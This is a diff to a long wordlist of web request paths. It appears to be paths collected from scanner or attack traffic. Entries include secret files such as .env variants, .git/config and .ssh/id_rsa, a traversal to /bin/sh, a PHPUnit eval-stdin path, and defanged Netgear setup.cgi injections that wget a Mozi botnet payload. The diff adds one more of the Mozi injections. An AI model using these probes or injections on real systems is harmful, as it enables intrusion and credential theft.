@@ -4,8 +4,8 @@ SDK/webLanguage
 .git/config
 .env.production
 .env.bak
-app/.env
 robots.txt
+app/.env
 .env.local
 api/.env
 .env.save
@@ -260,6 +260,7 @@ build/.env
 .env.ci
 .env.secret
 .env_
+admin/config.php
 app/.git/config
 cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
 config.php
@@ -283,7 +284,6 @@ server/.git/config
 .env.swp
 .htaccess
 .ssh/id_rsa
-admin/config.php
 public/.git/config
 vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
 .vscode/sftp.json
@@ -676,6 +676,7 @@ hudson
 id_dsa
 inc/config.php
 includes/config.php
+index.php
 laravel/.env.local
 laravel/.env.production
 laravel/.env.staging
@@ -847,6 +848,8 @@ admin.php
 admin/.env.local
 admin/.env.staging
 admin/login
+admin/modules/framework/amp_conf/htdocs/admin/config.php
+admin/modules/framework/amp_conf/var/www/html/admin/config.php
 alpha/.env
 amplify/team-provider-info.json
 anaconda/.env
@@ -974,10 +977,10 @@ icon/.env
 icons/.env
 id_ed25519
 image_data/.env
+images/
 img/.env
 includes/.env
 index.htm
-index.php
 infra/.env
 install.php
 internal/.env
@@ -1000,6 +1003,7 @@ market/.env.production
 market/.env.staging
 mcp.json
 misc/.env
+modules/faxnew/lang/
 mysql.php
 newsite/.env
 nginx-server/.env
@@ -1871,8 +1875,6 @@ actuator/favicon.ico
 admin-panel/.env
 admin/.env.bak
 admin/.env.old
-admin/modules/framework/amp_conf/htdocs/admin/config.php
-admin/modules/framework/amp_conf/var/www/html/admin/config.php
 admin/reports/status
 admin/reports/updates
 adminapp/.env
@@ -2230,7 +2232,6 @@ httpboot/.env
 httpdocs/.env
 human.aspx_arg12=infotech
 ikiwiki/.env
-images/
 images/logo.gif
 images/logo.png
 images/transparentpix.gif
@@ -2309,7 +2310,6 @@ minified/.env
 mock/.env
 models/.env
 modules/.env
-modules/faxnew/lang/
 monerod/.env
 mongodb/config/dev/.env
 monitoring/compose/.env
@@ -4432,6 +4432,7 @@ settings.tar.gz
 settings.zip
 setup.cgi_next_file=netgear.cfg_todo=syscmd_cmd=rm_DEFANGED+/tmp/__wget+http://127.0.0.1:43816/Mozi.m+-O+/tmp/netgear_sh+netgear_curpath=/_currentsetting.htm=1
 setup.cgi_next_file=netgear.cfg_todo=syscmd_cmd=rm_DEFANGED+/tmp/__wget+http://127.0.0.1:47090/Mozi.m+-O+/tmp/netgear_sh+netgear_curpath=/_currentsetting.htm=1
+setup.cgi_next_file=netgear.cfg_todo=syscmd_cmd=rm_DEFANGED+/tmp/__wget+http://127.0.0.1:49626/Mozi.m+-O+/tmp/netgear_sh+netgear_curpath=/_currentsetting.htm=1
 setup.cgi_next_file=netgear.cfg_todo=syscmd_cmd=rm_DEFANGED+/tmp/__wget+http://127.0.0.1:49785/Mozi.m+-O+/tmp/netgear_sh+netgear_curpath=/_currentsetting.htm=1
 setup.cgi_next_file=netgear.cfg_todo=syscmd_cmd=rm_DEFANGED+/tmp/__wget+http://127.0.0.1:57919/Mozi.m+-O+/tmp/netgear_sh+netgear_curpath=/_currentsetting.htm=1
 shared/config/config.js_v=18e6211129bdf844
